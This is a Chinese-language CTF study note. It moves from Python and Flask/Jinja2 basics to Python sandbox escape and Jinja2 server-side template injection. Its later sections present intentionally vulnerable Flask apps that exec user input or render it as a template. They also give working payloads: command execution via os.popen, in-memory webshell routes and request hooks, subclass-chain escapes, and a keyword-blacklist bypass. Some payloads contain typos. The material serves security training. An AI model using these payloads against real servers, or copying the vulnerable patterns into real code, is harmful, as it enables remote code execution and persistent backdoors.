# 主题：python沙箱与ssti(jinja2)

云文档: https://doc.weixin.qq.com/doc/w3_AV4A0QaYAIoYb700En5SsqbaVhU4l?scode=APUACwdKABEAMrANAQAV4A0QaYAIo&version=4.1.32.6005&platform=win

## 基础知识

### python

Python 是一种广泛使用的高级编程语言，具有简洁的语法和强大的功能。它被用于 Web 开发、数据分析、人工智能、自动化脚本、科学计算等领域。以下是 Python 基础知识的一些关键点，适合初学者快速掌握。

#### 1. **Python 基础语法**

##### (1) **变量和数据类型**

Python 是动态类型语言，无需声明变量类型，变量类型由值决定。

```python
# 变量赋值
x = 5        # 整型
name = "Tom"  # 字符串
pi = 3.14     # 浮动类型
is_active = True  # 布尔值
```

##### (2) **基本数据类型**

- **整数（int）**：如 `5`, `100`
- **浮动数（float）**：如 `3.14`, `0.99`
- **字符串（str）**：如 `"Hello, World!"`
- **布尔值（bool）**：如 `True`, `False`
- **列表（list）**：如 `[1, 2, 3]`
- **元组（tuple）**：如 `(1, 2, 3)`
- **集合（set）**：如 `{1, 2, 3}`
- **字典（dict）**：如 `{"name": "Tom", "age": 20}`

##### (3) **基本操作**

- **算术运算**：`+`, `-`, `*`, `/`, `//`（整除）, `%`（取余）, `**`（幂运算）
- **比较运算**：`==`, `!=`, `>`, `<`, `>=`, `<=`
- **逻辑运算**：`and`, `or`, `not`

```python
# 运算示例
x = 10
y = 5

sum_result = x + y   # 加法
div_result = x / y   # 除法
mul_result = x * y   # 乘法
mod_result = x % y   # 取余

# 比较运算
is_equal = (x == y)  # 是否相等
is_greater = (x > y) # 是否大于

# 逻辑运算
is_valid = (x > 5 and y < 10)
```

#### 2. **控制结构**

##### (1) **条件语句**

使用 `if`, `elif`, `else` 来进行条件判断。

```python
x = 10
if x > 0:
    print("Positive")
elif x == 0:
    print("Zero")
else:
    print("Negative")
```

##### (2) **循环语句**

- **for 循环**：用于遍历可迭代对象（如列表、字符串、范围等）。

```python
# 遍历列表
fruits = ["apple", "banana", "cherry"]
for fruit in fruits:
    print(fruit)

# 遍历数字范围
for i in range(1, 6):  # 1 到 5
    print(i)
```

- **while 循环**：只要条件为 `True` 就执行。

```python
count = 0
while count < 5:
    print(count)
    count += 1
```

##### (3) **跳出循环**

- **break**：跳出当前循环。
- **continue**：跳过当前循环的剩余部分，进入下一次循环。

```python
for i in range(5):
    if i == 3:
        break  # 跳出循环
    print(i)

for i in range(5):
    if i == 3:
        continue  # 跳过当前迭代
    print(i)
```

#### 3. **函数**

##### (1) **定义函数**

使用 `def` 关键字定义函数。

```python
def greet(name):
    return f"Hello, {name}!"

# 调用函数
message = greet("Tom")
print(message)
```

##### (2) **函数参数**

Python 函数可以有默认参数、可变参数等。

```python
# 默认参数
def greet(name="Guest"):
    return f"Hello, {name}!"
    
print(greet())        # 使用默认参数
print(greet("Alice")) # 使用传入的参数

# 可变参数
def add_numbers(*args):
    return sum(args)

print(add_numbers(1, 2, 3, 4))  # 输出 10
```

#### 4. **数据结构**

##### (1) **列表（List）**

- 列表是一个有序的、可变的集合，可以包含不同类型的数据。

```python
# 创建列表
fruits = ["apple", "banana", "cherry"]

# 访问元素
print(fruits[0])  # 访问第一个元素

# 添加元素
fruits.append("orange")

# 删除元素
fruits.remove("banana")

# 列表切片
print(fruits[1:3])  # 输出 ['banana', 'cherry']
```

##### (2) **元组（Tuple）**

- 元组是一个有序的、不可变的集合。

```python
# 创建元组
coordinates = (10, 20)

# 访问元组元素
print(coordinates[0])
```

##### (3) **字典（Dictionary）**

- 字典是无序的键值对集合，可以通过键快速访问值。

```python
# 创建字典
person = {"name": "Tom", "age": 20}

# 访问字典值
print(person["name"])  # 输出 'Tom'

# 添加或修改键值对
person["city"] = "New York"

# 删除键值对
del person["age"]
```

##### (4) **集合（Set）**

- 集合是一个无序且不重复的元素集合。

```python
# 创建集合
numbers = {1, 2, 3, 4}

# 添加元素
numbers.add(5)

# 删除元素
numbers.remove(2)
```

#### 5. **面向对象编程（OOP）**

Python 是一门支持面向对象编程的语言，提供了类和对象的概念。

##### (1) **定义类和对象**

类是对象的模板，而对象是类的实例。

```python
# 定义一个类
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def greet(self):
        return f"Hello, my name is {self.name} and I am {self.age} years old."

# 创建对象
person1 = Person("Tom", 20)

# 调用方法
print(person1.greet())
```

##### (2) **继承**

通过继承可以扩展类的功能。

```python
class Student(Person):
    def __init__(self, name, age, student_id):
        super().__init__(name, age)  # 调用父类构造函数
        self.student_id = student_id

    def greet(self):
        return f"Hello, my name is {self.name}, I am {self.age} years old, and my student ID is {self.student_id}."

student1 = Student("Alice", 22, "S12345")
print(student1.greet())
```

##### (3) 一些重要的魔法方法

```
__class__ # 查找当前类型的所属对象
__mro__ # 查找当前类对象的所有继承类
__subclasses__ # 查找父类下的所有子类，一个函数
__globals__ # 函数会议字典的形式返回当前对象的全部全局变量
__init__ # 查看类是否重载，重载是指程序在运行是就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载
__base__ # 沿着父子类的关系往上走一个
__bases__ # 查找当前类对象的所有继承类
__builtins__ #是一个内建的字典，包含了所有内建的函数和对象
__getattribute__ # 获取属性
__getitem__ #获取字典中的键值

object是父子关系的顶端，所有的数据类型最终的父类都是object
type是类型实例关系，所有对象都是type的实例
object和type既是类也是实例，因为object是type的一个实例，但是type又是object的子类，type自己创造了自己，object是type的父类，type创造了object
```

#### 6. **文件操作**

##### (1) **打开文件**

使用 `open()` 函数打开文件，支持多种模式，如 `'r'`（读取）、`'w'`（写入）、`'a'`（追加）等。

```python
# 读取文件
with open('example.txt', 'r') as file:
    content = file.read()
    print(content)

# 写入文件
with open('output.txt', 'w') as file:
    file.write("Hello, Python!")
```

##### (2) **读取文件的多种方式**

- 逐行读取：`file.readline()` 或 `file.readlines()`
- 读取整个文件：`file.read()`

#### 7. **装饰器**

装饰器是 Python 中的一种设计模式，用来在不修改函数代码的情况下，动态地添加一些额外的功能。装饰器本质上是一个函数，它接收一个函数作为参数，并返回一个新的函数，通常是对原函数的增强或修改。

- **装饰器的基本语法**：

  ```python
  def decorator(func):
      def wrapper():
          print("Before function call")
          func()
          print("After function call")
      return wrapper
  
  @decorator
  def say_hello():
      print("Hello!")
  
  say_hello()
  ```

- **解释**：

  - `decorator` 是一个装饰器函数，它接收一个函数 `func` 作为参数，并定义了一个内部函数 `wrapper`，该函数在执行 `func()` 前后执行额外的操作（在这里是打印信息）。
  - 使用 `@decorator` 语法，将装饰器应用到 `say_hello` 函数上，这等同于 `say_hello = decorator(say_hello)`。
  - 当调用 `say_hello()` 时，实际上执行的是 `wrapper()` 函数。

- **输出**：

  ```bash
  Before function call
  Hello!
  After function call
  ```

- **带参数的装饰器**： 如果装饰器需要处理带参数的函数，可以通过在 `wrapper` 函数中接受任意数量的参数来实现。

  ```python
  def decorator(func):
      def wrapper(*args, **kwargs):
          print("Before function call")
          result = func(*args, **kwargs)
          print("After function call")
          return result
      return wrapper
  
  @decorator
  def add(a, b):
      return a + b
  
  print(add(5, 3))  # 输出：Before function call \n After function call \n 8
  ```

##### **装饰器应用实例：日志记录**

装饰器常用于日志记录、权限验证、性能测试等场景。以下是一个简单的日志记录装饰器的示例：

```python
def log_function_call(func):
    def wrapper(*args, **kwargs):
        print(f"Calling function {func.__name__} with arguments: {args}, {kwargs}")
        result = func(*args, **kwargs)
        print(f"Function {func.__name__} returned {result}")
        return result
    return wrapper

@log_function_call
def multiply(a, b):
    return a * b

multiply(2, 3)
```

- 输出：

  ```bash
  Calling function multiply with arguments: (2, 3), {}
  Function multiply returned 6
  ```

#### 8. **异常处理**

Python 使用 `try`、`except` 语句来捕获和处理异常，确保程序的健壮性。

```python
try:
    x = 10 / 0
except ZeroDivisionError:
    print("Cannot divide by zero!")
finally:
    print("This block is always executed.")
```

#### 9. **模块和包**

Python 允许将代码组织成模块（`.py` 文件）和包（包含多个模块的文件夹）。可以使用 `import` 语句来导入模块或包。

```python
import math
print(math.sqrt(16))  # 输出 4.0

from datetime import datetime
now = datetime.now()
print(now)
```

#### 10. **常用标准库**

- **`os`**：与操作系统交互，如文件操作、路径操作。

- **`sys`**：与 Python 解释器交互，如获取命令行参数。

- **`math`**：提供数学函数，如 `sqrt`, `sin`, `cos` 等。

- **`random`**：生成随机数。

- **`datetime`**：处理日期和时间。

  #### **库与包的关系**

  - **库（Library）** 是一个更宽泛的概念，指的是解决某一问题的功能集合。它可能是一个单一的模块，也可能是一个包含多个模块的包。
  - **包（Package）** 是 Python 中一种组织模块的方式，是一个目录结构，通常包含多个模块和子包。包是库的一种形式，但库不一定是包。



### flask

Flask 是一个轻量级的 Web 框架，采用 Python 编写，适用于构建 Web 应用程序和 RESTful API。它遵循 **WSGI**（Web Server Gateway Interface）标准，设计上追求简洁和灵活，适合初学者和小型项目。Flask 本身非常轻便，但你可以通过安装扩展来增强其功能，灵活性非常高。

#### 1. **Flask 基础概念**

Flask 框架的核心是一个 WSGI 应用，通常包含以下几个基本元素：

- **路由（Route）**：定义 URL 路径与视图函数之间的映射。
- **视图函数（View Function）**：处理 HTTP 请求并返回响应。
- **模板引擎（Jinja2）**：用于生成动态 HTML 页面的模板引擎。
- **请求与响应（Request & Response）**：处理 HTTP 请求和生成 HTTP 响应。

#### 2. **安装 Flask**

你可以使用 `pip` 安装 Flask：

```bash
pip install Flask
```

#### 3. **Flask 项目的基本结构**

Flask 项目通常是一个 Python 脚本文件，包含路由和视图函数。以下是一个简单的 Flask 项目的结构：

```
my_flask_app/
    ├── app.py      # 主应用文件，包含路由和视图
    ├── templates/  # 存放 HTML 模板文件
    └── static/     # 存放静态文件（如 CSS, JavaScript, 图片等）
```

#### 4. **Flask Hello World 示例**

一个简单的 Flask 应用通常从创建一个 Flask 实例开始，然后定义路由和视图函数：

```python
# 导入 Flask
from flask import Flask

# 创建 Flask 应用实例
app = Flask(__name__)

# 定义路由
@app.route('/')
def hello_world():
    return 'Hello, World!'

# 启动应用
if __name__ == '__main__':
    app.run(debug=True)
```

- `Flask(__name__)`：创建一个 Flask 应用实例，`__name__` 是当前模块的名字，它有助于 Flask 确定应用的根目录。
- `@app.route('/')`：定义路由，当用户访问网站根目录（`/`）时，执行 `hello_world()` 函数。
- `app.run(debug=True)`：启动 Flask 应用，`debug=True` 启用调试模式，可以在代码修改后自动重启服务器并显示详细错误信息。

#### 5. **Flask 路由和视图函数**

Flask 中的路由负责将用户请求的 URL 映射到对应的视图函数。视图函数返回一个响应，通常是 HTML 页面。

```python
@app.route('/hello')
def hello():
    return "Hello, Flask!"
```

##### 路由的参数：

- **动态 URL 路由**：可以在路由中使用动态参数。

```python
@app.route('/user/<username>')
def show_user_profile(username):
    return f'User: {username}'
```

- **转换器**：Flask 支持不同类型的参数转换器，如 `int`, `float`, `path` 等。

```python
@app.route('/post/<int:post_id>')
def show_post(post_id):
    return f'Post ID: {post_id}'
```

#### 6. **Flask 模板引擎（Jinja2）**

Flask 使用 **Jinja2** 作为模板引擎，允许你在 HTML 文件中嵌入 Python 表达式。模板可以与视图函数结合使用，动态生成网页。

##### (1) **基本模板**

创建一个 `templates` 文件夹，并在其中放置 HTML 文件。例如，`hello.html`：

```html
<!DOCTYPE html>
<html>
<head>
    <title>Hello, Flask!</title>
</head>
<body>
    <h1>Hello, {{ name }}!</h1>
</body>
</html>
```

##### (2) **在视图函数中渲染模板**

```python
from flask import render_template

@app.route('/hello/<name>')
def hello(name):
    return render_template('hello.html', name=name)
```

- `render_template()` 函数会渲染 `hello.html` 模板，并传递 `name` 变量到模板中。

#### 7. **Flask 静态文件**

Flask 会自动查找名为 `static` 的文件夹，其中的文件可以通过 `/static` URL 路径来访问。这些文件通常包括 CSS 文件、JavaScript 文件和图片。

例如：

```
my_flask_app/
    ├── app.py
    ├── static/
    │   └── style.css
    └── templates/
        └── index.html
```

在模板文件中引用静态文件：

```html
<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
```

#### 8. **Flask 请求与响应**

##### (1) **请求（Request）**

Flask 提供了 `request` 对象，用于获取客户端请求的数据。

- **获取表单数据**：

```python
from flask import request

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    return f'Username: {username}, Password: {password}'
```

- **获取查询参数**：

```python
@app.route('/search')
def search():
    query = request.args.get('q')
    return f'Searching for: {query}'
```

##### (2) **响应（Response）**

Flask 中的视图函数默认返回一个响应对象。可以返回字符串、HTML、JSON 数据等。

```python
from flask import jsonify

@app.route('/api')
def api():
    data = {"message": "Hello, API!"}
    return jsonify(data)  # 返回 JSON 格式的响应
```

#### 9. **Flask 表单处理与重定向**

Flask 提供了多种方法来处理表单数据，并可以进行页面重定向。

- **重定向**：

```python
from flask import redirect, url_for

@app.route('/redirect')
def redirect_to_home():
    return redirect(url_for('home'))
```

- **表单处理**（结合 HTML 和 Flask）：

```python
from flask import request, render_template

@app.route('/submit', methods=['POST'])
def submit():
    name = request.form['name']
    return f'Hello, {name}!'
```

#### 10. **Flask 数据库**

Flask 本身不包含数据库功能，但可以轻松集成数据库。常用的数据库连接方式包括：

- **SQLAlchemy**：一个ORM框架，用于与关系型数据库（如 MySQL, SQLite）交互。
- **Flask-SQLAlchemy**：Flask 的一个扩展，提供 SQLAlchemy 的集成。

```bash
pip install Flask-SQLAlchemy
from flask_sqlalchemy import SQLAlchemy

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///data.db'
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)

    def __repr__(self):
        return f'<User {self.username}>'
```

#### 11. **Flask 扩展**

Flask 提供了多个扩展，以便增加更多功能，如：

- **Flask-WTF**：表单处理和验证。
- **Flask-Login**：用户认证管理。
- **Flask-Mail**：发送电子邮件。
- **Flask-Migrate**：数据库迁移工具。

这些扩展可以通过 `pip` 安装，然后在应用中导入使用。

## python沙箱

沙箱环境是通过控制和限制代码的执行，保护系统免受恶意代码的危害。在 Flask 应用中，可能会通过如 `exec()`、`eval()` 或者其他动态执行代码的方式创建沙箱。这样的操作可能使得恶意用户能够通过注入代码进行远程代码执行 (RCE)。

### 题目：python沙箱1

```python
from flask import *

app = Flask(__name__)
@app.route('/rce', methods=['GET', 'POST'])
def rce():
    if request.method == 'POST':
        code = request.form['code']
        exec(code) #换成eval()呢？
    return render_template('rce.html')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

#思考：要是没有static目录，怎么办？
```

沙箱里有globals()的全局变量与函数

#### 1.写静态目录 

```python
import os;os.system('ls >static/1') 
__import__('os').system('')#eval时适用
```

```python
#Fifker
import os
with open("static/test.txt",'w') as f:
	f.write(os.popen('dir').read())
```

#### 2.写templates/rce.html模板文件

#### 3.写app.py热加载

```
__import__('os').system("sed -i \"s/rce.html/`cat /f*`/\" rce.py")
```

#### 4.打内存马

```python
#HDdss
app._got_first_request=False;app.add_url_rule('/shell','shel1',lambda:'<pre>{0}</pre>'.format(import_('os').popen(request.args.get('cmd')).read()))

app.before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen('').read())

app.after_request_funcs.setdefault(None, []).append(lambda x: y if exec('import os;global y;y=make_response(os.popen("dir").read())')==None else x)
```

#### 5.利用沙箱中函数的\_\_globals\_\_属性获取\_\_builtins\_\_

```python
ur1_for.__globals__['__builtins__']['eval']
```

```python
get_flashed_messages,lipsum.......
```

```python
#cookie
ur1_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None,[])append(lambda resp:CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import __(\'os\').popen(request.args.get(\'cmd\'))read())\")==None else resp)",{'request':ur1_for.__globals__['request'],'app':ur1_for.__g1obals__['sys'].modules['__main__'].__dict__['app']})
```

#### 6.利用继承关系逃逸

```python
 for i in ''.__class__.__base__.__subclasses__():
     c+=1
     if 'wrapper' not in str(i.__init__):
         print(c)
        #找非wrapper的init函数
```

```python
''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['eval']("''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['__import__']('os').popen('dir').read()")
```

**os._wrap_close**在os.py里定义，他的init函数globals属性获取到的全局变量与函数包括在os.py里定义的，有system,popen

```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("")
```

**warnings.catch_warnings**类在在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__(很多模块都包含builtins吧)

```python
#zero6six
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']("os").system("cat ../flag templates/rce.html")
```

#### 7.复写函数

```python
global render_template;render_template=lambda x:__import__('os').popen('').read()
```

### 题目：python沙箱2

```python
from flask import *
app = Flask(__name__)


@app.route('/rce', methods=['GET', 'POST'])
def rce():
    if request.method == 'POST':
        code = request.form['code']
        restricted_globals = {
             '__builtins__': {},
        }
        exec(code, restricted_globals)
    return render_template('rce.html')


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

沙箱里没有全局变量全局函数（builtin的，flask的都没），利用继承关系逃逸

## python ssti

![image-20250118152124960](C:\Users\tiand\AppData\Roaming\Typora\typora-user-images\image-20250118152124960.png)

SSTI 是指通过模板引擎（如 Jinja2）执行恶意模板语法，从而导致远程代码执行的漏洞。在 Flask 中，Jinja2 是默认的模板引擎，它的语法允许动态生成 HTML 内容，但不当使用时可能被攻击者利用。

### flask的jinja2

Flask 使用 Jinja2 作为默认的模板引擎，它允许你在 HTML 文件中嵌入 Python 代码，使得生成动态网页变得更加容易。

#### 1. **模板渲染**

在 Flask 中，可以通过 `render_template()` 函数将模板渲染到浏览器中。

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html', name='xt')

if __name__ == '__main__':
    app.run(debug=True)
```

在 `index.html` 中，你可以使用 Jinja2 语法来插入动态内容：

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>首页</title>
</head>
<body>
    <h1>欢迎，{{ name }}！</h1>
</body>
</html>
```

#### 2. **变量**

使用 `{{ }}` 来输出变量。例如，上面的 `{{ name }}` 就会渲染为 `xt`。

#### 3. **控制结构**

Jinja2 提供了常用的控制结构，如 `if` 语句、`for` 循环等。

##### if 语句

```html
{% if user %}
    <p>你好，{{ user.name }}！</p>
{% else %}
    <p>请登录。</p>
{% endif %}
```

##### for 循环

```html
<ul>
    {% for item in items %}
        <li>{{ item }}</li>
    {% endfor %}
</ul>
```

#### 4. **过滤器**

Jinja2 提供了过滤器来处理数据，例如格式化日期、字符串转换等。

```html
<p>{{ "hello world"|capitalize }}</p>  <!-- 输出：Hello world -->
<p>{{ 3.14159|round(2) }}</p>  <!-- 输出：3.14 -->
```

#### 5. **模板继承**

模板继承可以帮助你在多个页面之间共享相同的布局。例如，你可以定义一个基础模板 `base.html`：

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>{% block title %}默认标题{% endblock %}</title>
</head>
<body>
    <header>
        <h1>我的网站</h1>
    </header>
    
    <div>
        {% block content %}{% endblock %}
    </div>
</body>
</html>
```

然后，其他模板可以继承它并覆盖其中的 `block` 内容：

```html
{% extends "base.html" %}

{% block title %}首页{% endblock %}

{% block content %}
    <h2>欢迎来到首页！</h2>
{% endblock %}
```

#### 6. **宏 (Macros)**

Jinja2 还支持定义宏，以便重用模板中的代码片段。

```html
{% macro render_input(name, value='', type='text') %}
    <input type="{{ type }}" name="{{ name }}" value="{{ value }}">
{% endmacro %}
```

在模板中使用宏：

```html
<form>
    {{ render_input('username') }}
    {{ render_input('password', type='password') }}
</form>
```

#### 7. **空值处理**

Jinja2 提供了 `default` 过滤器来处理空值。

```html
<p>{{ user.name | default('匿名用户') }}</p>
```

#### 8. **自动转义**

默认情况下，Jinja2 会自动对输出进行 HTML 转义，以防止 XSS 攻击。如果你需要输出原始 HTML，可以使用 `|safe` 过滤器：

```html
<p>{{ user.bio | safe }}</p>
```



#### 查看flask的jinja2沙箱中globals(全局变量与全局函数)

```python
from flask import Flask

app = Flask(__name__)


@app.route('/')
def index():
    jinja_globals = app.jinja_env.globals

    print(jinja_globals)
    return "jinja_globals"
#获取沙箱中全局变量全局函数

if __name__ == '__main__':
    app.run(debug=True)
```

```json
{'range': <class 'range'>, 
'dict': <class 'dict'>, 
'lipsum': <function generate_lorem_ipsum at 0x000002049AACD800>, 
'cycler': <class 'jinja2.utils.Cycler'>, 
'joiner': <class 'jinja2.utils.Joiner'>, 
'namespace': <class 'jinja2.utils.Namespace'>, 
'url_for': <bound method Flask.url_for of <Flask 'test'>>, 
'get_flashed_messages': <function get_flashed_messages at 0x000002049B62F740>, 

'config': <Config {'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 		   'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>, 

'request': <Request 'http://127.0.0.1:5000/' [GET]>, 
'session': <NullSession {}>, 
'g': <flask.g of 'test'>}
```

#### 查看flask的jinja2沙箱中过滤器

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    jinja_filters = app.jinja_env.filters
    
    print(jinja_filters)
    return "jinja_filters"
#获取可用过滤器
if __name__ == '__main__':
    app.run(debug=True)
```

```json
{'abs': <built-in function abs>, 
 'attr': <function do_attr at 0x00000216DF1E0180>, 
 'batch': <function do_batch at 0x00000216DF1DAE80>, 
 'capitalize': <function do_capitalize at 0x00000216DF1D99E0>, 
 'center': <function do_center at 0x00000216DF1DA020>, 
 'count': <built-in function len>, 'd': <function do_default at 0x00000216DF1D9EE0>, 
 'default': <function do_default at 0x00000216DF1D9EE0>, 
 'dictsort': <function do_dictsort at 0x00000216DF1D9B20>, 
 'e': <built-in function escape>, 'escape': <built-in function escape>, 
 'filesizeformat': <function do_filesizeformat at 0x00000216DF1DA660>, 
 'first': <function do_first at 0x00000216DF1DA520>, 
 'float': <function do_float at 0x00000216DF1DAB60>, 
 'forceescape': <function do_forceescape at 0x00000216DF1D9580>, 
 'format': <function do_format at 0x00000216DF1DAC00>, 
 'groupby': <function do_groupby at 0x00000216DF1DB880>, 
 'indent': <function do_indent at 0x00000216DF1DA840>, 
 'int': <function do_int at 0x00000216DF1DAAC0>, 
 'join': <function do_join at 0x00000216DF1DA200>, 
 'last': <function do_last at 0x00000216DF1DA340>, 
 'length': <built-in function len>, 
 'list': <function do_list at 0x00000216DF1DBD80>, 
 'lower': <function do_lower at 0x00000216DF1D9800>, 
 'items': <function do_items at 0x00000216DF1D98A0>, 
 'map': <function do_map at 0x00000216DF1E0860>, 
 'min': <function do_min at 0x00000216DF1D9DA0>, 
 'max': <function do_max at 0x00000216DF1D9E40>, 
 'pprint': <function do_pprint at 0x00000216DF1DA700>, 
 'random': <function do_random at 0x00000216DF1DA5C0>, 
 'reject': <function do_reject at 0x00000216DF1E0D60>, 
 'rejectattr': <function do_rejectattr at 0x00000216DF1E1260>, 
 'replace': <function do_replace at 0x00000216DF1D96C0>, 
 'reverse': <function do_reverse at 0x00000216DF1E00E0>, 
 'round': <function do_round at 0x00000216DF1DB100>, 
 'safe': <function do_mark_safe at 0x00000216DF1DBBA0>, 
 'select': <function do_select at 0x00000216DF1E0AE0>, 
 'selectattr': <function do_selectattr at 0x00000216DF1E0FE0>, 
 'slice': <function do_slice at 0x00000216DF1DB060>, 
 'sort': <function do_sort at 0x00000216DF1D9BC0>, 
 'string': <built-in function soft_str>, 
 'striptags': <function do_striptags at 0x00000216DF1DAD40>, 
 'sum': <function do_sum at 0x00000216DF1DBB00>, 
 'title': <function do_title at 0x00000216DF1D9A80>, 
 'trim': <function do_trim at 0x00000216DF1DACA0>, 
 'truncate': <function do_truncate at 0x00000216DF1DA8E0>, 
 'unique': <function do_unique at 0x00000216DF1D9C60>, 
 'upper': <function do_upper at 0x00000216DF1D9760>, 
 'urlencode': <function do_urlencode at 0x00000216DF1D9620>, 
 'urlize': <function do_urlize at 0x00000216DF1DA7A0>, 
 'wordcount': <function do_wordcount at 0x00000216DF1DAA20>, 
 'wordwrap': <function do_wordwrap at 0x00000216DF1DA980>, 
 'xmlattr': <function do_xmlattr at 0x00000216DF1D9940>, 
 'tojson': <function do_tojson at 0x00000216DF1E1080>}
```

### 题目：python ssti1

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/ssti', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form['name']
        str = f'<h1>{name} is sb</h1>'
    return render_template_string(str)
    #没回显怎么办(比如最后一句换成)
    #render_template_string(str)
    #return 'success'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

```
{{url_for.__globals__.__builtins__['eval']("__import__('os').popen('dir').read()")}}
```

### 题目：python ssti2

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)
@app.post('/ssti')
def index():
    if request.method == 'POST':
        name = request.form['name']
        blacklist = ['__','builtin','globals','app','url_for','get_flashed_messages','lipsum','init','os']
        if any(i in name for i in blacklist):
            return '滚丫'
        str = f'<h1>{name} is sb</h1>'
        return render_template_string(str)
        #没回显怎么办(比如最后一句换成)
        #render_template_string(str)
        #return 'success'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

```
{{request["_"+'_ini'+'t_'+'_']['_'+"_global"+"s_"+"_"]["_"+"_built"+"ins_"+"_"]["eval"]("_"+"_import_"+"_('o"+"s').popen('dir').read()")}}
```

其他的payload自由发挥，基本根据黑名单的不同而变化

**黑名单绕过** 

简单来说就是用等价形式代替

https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/

https://blog.csdn.net/miuzzx/article/details/110220425